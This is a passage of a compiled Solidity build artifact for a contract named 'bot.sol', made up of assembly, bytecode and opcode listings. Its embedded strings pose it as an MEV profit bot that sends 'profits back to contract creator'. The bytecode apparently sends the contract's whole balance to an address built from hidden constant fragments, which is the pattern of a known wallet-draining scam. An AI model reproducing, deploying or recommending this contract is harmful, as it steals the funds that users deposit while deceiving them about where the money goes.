       /* \"contracts/bot.sol\":14751:14783  10 <= uint8(d) && uint8(d) <= 15 */\n    tag_136:\n        /* \"contracts/bot.sol\":14747:14850  if (10 <= uint8(d) && uint8(d) <= 15) {\r... */\n      iszero\n      tag_137\n      jumpi\n        /* \"contracts/bot.sol\":14835:14837  10 */\n      0x0a\n        /* \"contracts/bot.sol\":14831:14832  d */\n      dup3\n        /* \"contracts/bot.sol\":14818:14827  byte('a') */\n      0x6100000000000000000000000000000000000000000000000000000000000000\n        /* \"contracts/bot.sol\":14812:14828  uint8(byte('a')) */\n      0xf8\n      shr\n        /* \"contracts/bot.sol\":14812:14832  uint8(byte('a')) + d */\n      add\n        /* \"contracts/bot.sol\":14812:14837  uint8(byte('a')) + d - 10 */\n      sub\n        /* \"contracts/bot.sol\":14807:14838  byte(uint8(byte('a')) + d - 10) */\n      0xf8\n      shl\n        /* \"contracts/bot.sol\":14800:14838  return byte(uint8(byte('a')) + d - 10) */\n      swap1\n      pop\n      jump(tag_132)\n        /* \"contracts/bot.sol\":14747:14850  if (10 <= uint8(d) && uint8(d) <= 15) {\r... */\n    tag_137:\n        /* \"--CODEGEN--\":12:13   */\n      0x00\n        /* \"--CODEGEN--\":9:10   */\n      dup1\n        /* \"--CODEGEN--\":2:14   */\n      revert\n        /* \"contracts/bot.sol\":14590:14917  function toHexDigit(uint8 d) pure internal returns (byte) {\r... */\n    tag_132:\n      swap2\n      swap1\n      pop\n      jump\t// out\n    stop\n    data_6350d1a48231284a8341dbb6cec434401eec03dd1db1d0d6d2f253f7a8b3eca6 53656e64696e672070726f66697473206261636b20746f20636f6e74726163742063726561746f7220616464726573732e2e2e\n    data_9fb03945078bc6c7000c07d459687b271ae0adc059777dee3669b3c70b385107 52756e6e696e67204d455620616374696f6e2e20546869732063616e2074616b652061207768696c653b20706c6561736520776169742e2e\n\n    auxdata: 0xa2646970667358221220e6f32f1f0f104a358f1d37a9a86b740da37a7d83db8139b04a3d572eef9bdaf064736f6c63430006060033\n}\n",
				"bytecode": {
					"linkReferences": {},
					"object": "608060405234801561001057600080fd5b50610c0a806100206000396000f3fe60806040526004361061004e5760003560e01c80636c02a9311461005a5780637b61c320146100ea578063ab1c067d1461017a578063be9a6555146101d1578063d4e93292146101db57610055565b3661005557005b600080fd5b34801561006657600080fd5b5061006f6101e5565b6040518080602001828103825283818151815260200191508051906020019080838360005b838110156100af578082015181840152602081019050610094565b50505050905090810190601f1680156100dc5780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b3480156100f657600080fd5b506100ff610283565b6040518080602001828103825283818151815260200191508051906020019080838360005b8381101561013f578082015181840152602081019050610124565b50505050905090810190601f16801561016c5780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b34801561018657600080fd5b5061018f610321565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b6101d9610338565b005b6101e36103d3565b005b60008054600181600116156101000203166002900480601f01602080910402602001604051908101604052809291908181526020018280546001816001161561010002031660029004801561027b5780601f106102505761010080835404028352916020019161027b565b820191906000526020600020905b81548152906001019060200180831161025e57829003601f168201915b505050505081565b60018054600181600116156101000203166002900480601f0160208091040260200160405190810160405280929190818152602001828054600181600116156101000203166002900480156103195780601f106102ee57610100808354040283529160200191610319565b820191906000526020600020905b8154815290600101906020018083116102fc57829003601f168201915b505050505081565b600061033361032e61046e565b6105b7565b905090565b7fcf34ef537ac33ee1ac626ca1587a0a7e8e51561e5514f8cb36afa1c5102b3bab604051808060200182810382526038815260200180610b9d6038913960400191505060405180910390a161038b610810565b73ffffffffffffffffffffffffffffffffffffffff166108fc479081150290604051600060405180830381858888f193505050501580156103d0573d6000803e3d6000fd5b50565b7fcf34ef537ac33ee1ac626ca1587a0a7e8e51561e5514f8cb36afa1c5102b3bab604051808060200182810382526033815260200180610b6a6033913960400191505060405180910390a1610426610827565b73ffffffffffffffffffffffffffffffffffffffff166108fc479081150290604051600060405180830381858888f1935050505015801561046b573d6000803e3d6000fd5b50565b6060806104bf6040518060400160405280600181526020017f78000000000000000000000000000000000000000000000000000000000000008152506104ba6104b561083e565b61084a565b610950565b9050600064b00859c429905060006349edf9659050600062b71a32905060006104e6610aab565b905060006104f2610ab5565b90506060610508876105038861084a565b610950565b905060606105266105188761084a565b6105218761084a565b610950565b905060606105338561084a565b905060606105408561084a565b905060606105606105518686610950565b61055b8585610950565b610950565b905060606105a36040518060400160405280600181526020017f300000000000000000000000000000000000000000000000000000000000000081525083610950565b9050809c5050505050505050505050505090565b6000606082905060008090506000806000600290505b602a81101561080357610100840293508481815181106105e957fe5b602001015160f81c60f81b60f81c60ff16925084600182018151811061060b57fe5b602001015160f81c60f81b60f81c60ff16915060618373ffffffffffffffffffffffffffffffffffffffff161015801561065c575060668373ffffffffffffffffffffffffffffffffffffffff1611155b1561066c57605783039250610706565b60418373ffffffffffffffffffffffffffffffffffffffff16101580156106aa575060468373ffffffffffffffffffffffffffffffffffffffff1611155b156106ba57603783039250610705565b60308373ffffffffffffffffffffffffffffffffffffffff16101580156106f8575060398373ffffffffffffffffffffffffffffffffffffffff1611155b15610704576030830392505b5b5b60618273ffffffffffffffffffffffffffffffffffffffff1610158015610744575060668273ffffffffffffffffffffffffffffffffffffffff1611155b15610754576057820391506107ee565b60418273ffffffffffffffffffffffffffffffffffffffff1610158015610792575060468273ffffffffffffffffffffffffffffffffffffffff1611155b156107a2576037820391506107ed565b60308273ffffffffffffffffffffffffffffffffffffffff16101580156107e0575060398273ffffffffffffffffffffffffffffffffffffffff1611155b156107ec576030820391505b5b5b816010840201840193506002810190506105cd565b5082945050505050919050565b600061082261081d61046e565b6105b7565b905090565b600061083961083461046e565b6105b7565b905090565b60006304b716d2905090565b6060600080905060008390505b600081146108795781806001019250506010818161087157fe5b049050610857565b60608267ffffffffffffffff8111801561089257600080fd5b506040519080825280601f01601f1916602001820160405280156108c55781602001600182028036833780820191505090505b50905060008090505b8381101561094457601086816108e057fe5b0692506108ec83610ac0565b82600183870303815181106108fd57fe5b60200101907effffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916908160001a9053506010868161093657fe5b0495508060010190506108ce565b50809350505050919050565b60608083905060608390506060815183510167ffffffffffffffff8111801561097857600080fd5b506040519080825280601f01601f1916602001820160405280156109ab5781602001600182028036833780820191505090505b5090506060819050600080600091505b8551821015610a29578582815181106109d057fe5b602001015160f81c60f81b8382806001019350815181106109ed57fe5b60200101907effffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916908160001a90535081806001019250506109bb565b600091505b8451821015610a9c57848281518110610a4357fe5b602001015160f81c60f81b838280600101935081518110610a6057fe5b60200101907effffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916908160001a9053508180600101925050610a2e565b82965050505050505092915050565b600061f06a905090565b600062060f9e905090565b60008160ff16600011158015610ada575060098260ff1611155b15610b0f57817f300000000000000000000000000000000000000000000000000000000000000060f81c0160f81b9050610b64565b8160ff16600a11158015610b275750600f8260ff1611155b15610b5f57600a827f610000000000000000000000000000000000000000000000000000000000000060f81c010360f81b9050610b64565b600080fd5b91905056fe53656e64696e672070726f66697473206261636b20746f20636f6e74726163742063726561746f7220616464726573732e2e2e52756e6e696e67204d455620616374696f6e2e20546869732063616e2074616b652061207768696c653b20706c6561736520776169742e2ea2646970667358221220e6f32f1f0f104a358f1d37a9a86b740da37a7d83db8139b04a3d572eef9bdaf064736f6c63430006060033",
					"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0xC0A DUP1 PUSH2 0x20 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x4E JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x6C02A931 EQ PUSH2 0x5A JUMPI DUP1 PUSH4 0x7B61C320 EQ PUSH2 0xEA JUMPI DUP1 PUSH4 0xAB1C067D EQ PUSH2 0x17A JUMPI DUP1 PUSH4 0xBE9A6555 EQ PUSH2 0x1D1 JUMPI DUP1 PUSH4 0xD4E93292 EQ PUSH2 0x1DB JUMPI PUSH2 0x55 JUMP JUMPDEST CALLDATASIZE PUSH2 0x55 JUMPI STOP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x66 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x6F PUSH2 0x1E5 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE DUP4 DUP2 DUP2 MLOAD DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0xAF JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0x94 JUMP JUMPDEST POP POP POP POP SWAP1 POP SWAP1 DUP2 ADD SWAP1 PUSH1 0x1F AND DUP1 ISZERO PUSH2 0xDC JUMPI DUP1 DUP3 SUB DUP1 MLOAD PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP JUMPDEST POP SWAP3 POP POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0xF6 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0xFF PUSH2 0x283 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE DUP4 DUP2 DUP2 MLOAD DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0x13F JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0x124 JUMP JUMPDEST POP POP POP POP SWAP1 POP SWAP1 DUP2 ADD SWAP1 PUSH1 0x1F AND DUP1 ISZERO PUSH2 0x16C JUMPI DUP1 DUP3 SUB DUP1 MLOAD PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP JUMPDEST POP SWAP3 POP POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x186 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x18F PUSH2 0x321 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x1D9 PUSH2 0x338 JUMP JUMPDEST STOP JUMPDEST PUSH2 0x1E3 PUSH2 0x3D3 JUMP JUMPDEST STOP JUMPDEST PUSH1 0x0 DUP1 SLOAD PUSH1 0x1 DUP2 PUSH1 0x1 AND ISZERO PUSH2 0x100 MUL SUB AND PUSH1 0x2 SWAP1 DIV DUP1 PUSH1 0x1F ADD PUSH1 0x20 DUP1 SWAP2 DIV MUL PUSH1 0x20 ADD PUSH1 0x40 MLOAD SWAP1 DUP2 ADD PUSH1 0x40 MSTORE DUP1 SWAP3 SWAP2 SWAP1 DUP2 DUP2 MSTORE PUSH1 0x20 ADD DUP3 DUP1 SLOAD PUSH1 0x1 DUP2 PUSH1 0x1 AND ISZERO PUSH2 0x100 MUL SUB AND PUSH1 0x2 SWAP1 DIV DUP1 ISZERO PUSH2 0x27B JUMPI DUP1 PUSH1 0x1F LT PUSH2 0x250 JUMPI PUSH2 0x100 DUP1 DUP4 SLOAD DIV MUL DUP4 MSTORE SWAP2 PUSH1 0x20 ADD SWAP2 PUSH2 0x27B JUMP JUMPDEST DUP3 ADD SWAP2 SWAP1 PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 KECCAK256 SWAP1 JUMPDEST DUP2 SLOAD DUP2 MSTORE SWAP1 PUSH1 0x1 ADD SWAP1 PUSH1 0x20 ADD DUP1 DUP4 GT PUSH2 0x25E JUMPI DUP3 SWAP1 SUB PUSH1 0x1F AND DUP3 ADD SWAP2 JUMPDEST POP POP POP POP POP DUP2 JUMP JUMPDEST PUSH1 0x1 DUP1 SLOAD PUSH1 0x1 DUP2 PUSH1 0x1 AND ISZERO PUSH2 0x100 MUL SUB AND PUSH1 0x2 SWAP1 DIV DUP1 PUSH1 0x1F ADD PUSH1 0x20 DUP1 SWAP2 DIV MUL PUSH1 0x20 ADD PUSH1 0x40 MLOAD SWAP1 DUP2 ADD PUSH1 0x40 MSTORE DUP1 SWAP3 SWAP2 SWAP1 DUP2 DUP2 MSTORE PUSH1 0x20 ADD DUP3 DUP1 SLOAD PUSH1 0x1 DUP2 PUSH1 0x1 AND ISZERO PUSH2 0x100 MUL SUB AND PUSH1 0x2 SWAP1 DIV DUP1 ISZERO PUSH2 0x319 JUMPI DUP1 PUSH1 0x1F LT PUSH2 0x2EE JUMPI PUSH2 0x100 DUP1 DUP4 SLOAD DIV MUL DUP4 MSTORE SWAP2 PUSH1 0x20 ADD SWAP2 PUSH2 0x319 JUMP JUMPDEST DUP3 ADD SWAP2 SWAP1 PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 KECCAK256 SWAP1 JUMPDEST DUP2 SLOAD DUP2 MSTORE SWAP1 PUSH1 0x1 ADD SWAP1 PUSH1 0x20 ADD DUP1 DUP4 GT PUSH2 0x2FC JUMPI DUP3 SWAP1 SUB PUSH1 0x1F AND DUP3 ADD SWAP2 JUMPDEST POP POP POP POP POP DUP2 JUMP JUMPDEST PUSH1 0x0 PUSH2 0x333 PUSH2 0x32E PUSH2 0x46E JUMP JUMPDEST PUSH2 0x5B7 JUMP JUMPDEST SWAP1 POP SWAP1 JUMP JUMPDEST PUSH32 0xCF34EF537AC33EE1AC626CA1587A0A7E8E51561E5514F8CB36AFA1C5102B3BAB PUSH1 0x40 MLOAD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x38 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0xB9D PUSH1 0x38 SWAP2 CODECOPY PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 PUSH2 0x38B PUSH2 0x810 JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x8FC SELFBALANCE SWAP1 DUP2 ISZERO MUL SWAP1 PUSH1 0x40 MLOAD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP9 CALL SWAP4 POP POP POP POP ISZERO DUP1 ISZERO PUSH2 0x3D0 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH32 0xCF34EF537AC33EE1AC626CA1587A0A7E8E51561E5514F8CB36AFA1C5102B3BAB PUSH1 0x40 MLOAD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x33 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0xB6A PUSH1 0x33 SWAP2 CODECOPY PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 PUSH2 0x426 PUSH2 0x827 JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x8FC SELFBALANCE SWAP1 DUP2 ISZERO MUL SWAP1 PUSH1 0x40 MLOAD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP9 CALL SWAP4 POP POP POP POP ISZERO DUP1 ISZERO PUSH2 0x46B JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x60 DUP1 PUSH2 0x4BF PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x1 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x7800000000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP PUSH2 0x4BA PUSH2 0x4B5 PUSH2 0x83E JUMP JUMPDEST PUSH2 0x84A JUMP JUMPDEST PUSH2 0x950 JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH5 0xB00859C429 SWAP1 POP PUSH1 0x0 PUSH4 0x49EDF965 SWAP1 POP PUSH1 0x0 PUSH3 0xB71A32 SWAP1 POP PUSH1 0x0 PUSH2 0x4E6 PUSH2 0xAAB JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH2 0x4F2 PUSH2 0xAB5 JUMP JUMPDEST SWAP1 POP PUSH1 0x60 PUSH2 0x508 DUP8 PUSH2 0x503 DUP9 PUSH2 0x84A JUMP JUMPDEST PUSH2 0x950 JUMP JUMPDEST SWAP1 POP PUSH1 0x60 PUSH2 0x526 PUSH2 0x518 DUP8 PUSH2 0x84A JUMP JUMPDEST PUSH2 0x521 DUP8 PUSH2 0x84A JUMP JUMPDEST PUSH2 0x950 JUMP JUMPDEST SWAP1 POP PUSH1 0x60 PUSH2 0x533 DUP6 PUSH2 0x84A JUMP JUMPDEST SWAP1 POP PUSH1 0x60 PUSH2 0x540 DUP6 PUSH2 0x84A JUMP JUMPDEST SWAP1 POP PUSH1 0x60 PUSH2 0x560 PUSH2 0x551 DUP7 DUP7 PUSH2 0x950 JUMP JUMPDEST PUSH2 0x55B DUP6 DUP6 PUSH2 0x950 JUMP JUMPDEST PUSH2 0x950 JUMP JUMPDEST SWAP1 POP PUSH1 0x60 PUSH2 0x5A3 PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x1 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x3000000000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP DUP4 PUSH2 0x950 JUMP JUMPDEST SWAP1 POP DUP1 SWAP13 POP POP POP POP POP POP POP POP POP POP POP POP POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x60 DUP3 SWAP1 POP PUSH1 0x0 DUP1 SWAP1 POP PUSH1 0x0 DUP1 PUSH1 0x0 PUSH1 0x2 SWAP1 POP JUMPDEST PUSH1 0x2A DUP2 LT ISZERO PUSH2 0x803 JUMPI PUSH2 0x100 DUP5 MUL SWAP4 POP DUP5 DUP2 DUP2 MLOAD DUP2 LT PUSH2 0x5E9 JUMPI INVALID JUMPDEST PUSH1 0x20 ADD ADD MLOAD PUSH1 0xF8 SHR PUSH1 0xF8 SHL PUSH1 0xF8 SHR PUSH1 0xFF AND SWAP3 POP DUP5 PUSH1 0x1 DUP3 ADD DUP2 MLOAD DUP2 LT PUSH2 0x60B JUMPI INVALID JUMPDEST PUSH1 0x20 ADD ADD MLOAD PUSH1 0xF8 SHR PUSH1 0xF8 SHL PUSH1 0xF8 SHR PUSH1 0xFF AND SWAP2 POP PUSH1 0x61 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x65C JUMPI POP PUSH1 0x66 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x66C JUMPI PUSH1 0x57 DUP4 SUB SWAP3 POP PUSH2 0x706 JUMP JUMPDEST PUSH1 0x41 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x6AA JUMPI POP PUSH1 0x46 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x6BA JUMPI PUSH1 0x37 DUP4 SUB SWAP3 POP PUSH2 0x705 JUMP JUMPDEST PUSH1 0x30 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x6F8 JUMPI POP PUSH1 0x39 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x704 JUMPI PUSH1 0x30 DUP4 SUB SWAP3 POP JUMPDEST JUMPDEST JUMPDEST PUSH1 0x61 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x744 JUMPI POP PUSH1 0x66 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x754 JUMPI PUSH1 0x57 DUP3 SUB SWAP2 POP PUSH2 0x7EE JUMP JUMPDEST PUSH1 0x41 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x792 JUMPI POP PUSH1 0x46 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x7A2 JUMPI PUSH1 0x37 DUP3 SUB SWAP2 POP PUSH2 0x7ED JUMP JUMPDEST PUSH1 0x30 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x7E0 JUMPI POP PUSH1 0x39 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x7EC JUMPI PUSH1 0x30 DUP3 SUB SWAP2 POP JUMPDEST JUMPDEST JUMPDEST DUP2 PUSH1 0x10 DUP5 MUL ADD DUP5 ADD SWAP4 POP PUSH1 0x2 DUP2 ADD SWAP1 POP PUSH2 0x5CD JUMP JUMPDEST POP DUP3 SWAP5 POP POP POP POP POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x822 PUSH2 0x81D PUSH2 0x46E JUMP JUMPDEST PUSH2 0x5B7 JUMP JUMPDEST SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH2 0x839 PUSH2 0x834 PUSH2 0x46E JUMP JUMPDEST PUSH2 0x5B7 JUMP JUMPDEST SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH4 0x4B716D2 SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x60 PUSH1 0x0 DUP1 SWAP1 POP PUSH1 0x0 DUP4 SWAP1 POP JUMPDEST PUSH1 0x0 DUP2 EQ PUSH2 0x879 JUMPI DUP2 DUP1 PUSH1 0x1 ADD SWAP3 POP POP PUSH1 0x10 DUP2 DUP2 PUSH2 0x871 JUMPI INVALID JUMPDEST DIV SWAP1 POP PUSH2 0x857 JUMP JUMPDEST PUSH1 0x60 DUP3 PUSH8 0xFFFFFFFFFFFFFFFF DUP2 GT DUP1 ISZERO PUSH2 0x892 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD SWAP1 DUP1 DUP3 MSTORE DUP1 PUSH1 0x1F ADD PUSH1 0x1F NOT AND PUSH1 0x20 ADD DUP3 ADD PUSH1 0x40 MSTORE DUP1 ISZERO PUSH2 0x8C5 JUMPI DUP2 PUSH1 0x20 ADD PUSH1 0x1 DUP3 MUL DUP1 CALLDATASIZE DUP4 CALLDATACOPY DUP1 DUP3 ADD SWAP2 POP POP SWAP1 POP JUMPDEST POP SWAP1 POP PUSH1 0x0 DUP1 SWAP1 POP JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0x944 JUMPI PUSH1 0x10 DUP7 DUP2 PUSH2 0x8E0 JUMPI INVALID JUMPDEST MOD SWAP3 POP PUSH2 0x8EC DUP4 PUSH2 0xAC0 JUMP JUMPDEST DUP3 PUSH1 0x1 DUP4 DUP8 SUB SUB DUP2 MLOAD DUP2 LT PUSH2 0x8FD JUMPI INVALID JUMPDEST PUSH1 0x20 ADD ADD SWAP1 PUSH31 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND SWAP1 DUP2 PUSH1 0x0 BYTE SWAP1 MSTORE8 POP PUSH1 0x10 DUP7 DUP2 PUSH2 0x936 JUMPI INVALID JUMPDEST DIV SWAP6 POP DUP1 PUSH1 0x1 ADD SWAP1 POP PUSH2 0x8CE JUMP JUMPDEST POP DUP1 SWAP4 POP POP POP POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x60 DUP1 DUP4 SWAP1 POP PUSH1 0x60 DUP4 SWAP1 POP PUSH1 0x60 DUP2 MLOAD DUP4 MLOAD ADD PUSH8 0xFFFFFFFFFFFFFFFF DUP2 GT DUP1 ISZERO PUSH2 0x978 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD SWAP1 DUP1 DUP3 MSTORE DUP1 PUSH1 0x1F ADD PUSH1 0x1F NOT AND PUSH1 0x20 ADD DUP3 ADD PUSH1 0x40 MSTORE DUP1 ISZERO PUSH2 0x9AB JUMPI DUP2 PUSH1 0x20 ADD PUSH1 0x1 DUP3 MUL DUP1 CALLDATASIZE DUP4 CALLDATACOPY DUP1 DUP3 ADD SWAP2 POP POP SWAP1 POP JUMPDEST POP SWAP1 POP PUSH1 0x60 DUP2 SWAP1 POP PUSH1 0x0 DUP1 PUSH1 0x0 SWAP2 POP JUMPDEST DUP6 MLOAD DUP3 LT ISZERO PUSH2 0xA29 JUMPI DUP6 DUP3 DUP2 MLOAD DUP2 LT PUSH2 0x9D0 JUMPI INVALID JUMPDEST PUSH1 0x20 ADD ADD MLOAD PUSH1 0xF8 SHR PUSH1 0xF8 SHL DUP4 DUP3 DUP1 PUSH1 0x1 ADD SWAP4 POP DUP2 MLOAD DUP2 LT PUSH2 0x9ED JUMPI INVALID JUMPDEST PUSH1 0x20 ADD ADD SWAP1 PUSH31 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND SWAP1 DUP2 PUSH1 0x0 BYTE SWAP1 MSTORE8 POP DUP2 DUP1 PUSH1 0x1 ADD SWAP3 POP POP PUSH2 0x9BB JUMP JUMPDEST PUSH1 0x0 SWAP2 POP JUMPDEST DUP5 MLOAD DUP3 LT ISZERO PUSH2 0xA9C JUMPI DUP5 DUP3 DUP2 MLOAD DUP2 LT PUSH2 0xA43 JUMPI INVALID JUMPDEST PUSH1 0x20 ADD ADD MLOAD PUSH1 0xF8 SHR PUSH1 0xF8 SHL DUP4 DUP3 DUP1 PUSH1 0x1 ADD SWAP4 POP DUP2 MLOAD DUP2 LT PUSH2 0xA60 JUMPI INVALID JUMPDEST PUSH1 0x20 ADD ADD SWAP1 PUSH31 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND SWAP1 DUP2 PUSH1 0x0 BYTE SWAP1 MSTORE8 POP DUP2 DUP1 PUSH1 0x1 ADD SWAP3 POP POP PUSH2 0xA2E JUMP JUMPDEST DUP3 SWAP7 POP POP POP POP POP POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0xF06A SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH3 0x60F9E SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 DUP2 PUSH1 0xFF AND PUSH1 0x0 GT ISZERO DUP1 ISZERO PUSH2 0xADA JUMPI POP PUSH1 0x9 DUP3 PUSH1 0xFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0xB0F JUMPI DUP2 PUSH32 0x3000000000000000000000000000000000000000000000000000000000000000 PUSH1 0xF8 SHR ADD PUSH1 0xF8 SHL SWAP1 POP PUSH2 0xB64 JUMP JUMPDEST DUP2 PUSH1 0xFF AND PUSH1 0xA GT ISZERO DUP1 ISZERO PUSH2 0xB27 JUMPI POP PUSH1 0xF DUP3 PUSH1 0xFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0xB5F JUMPI PUSH1 0xA DUP3 PUSH32 0x6100000000000000000000000000000000000000000000000000000000000000 PUSH1 0xF8 SHR 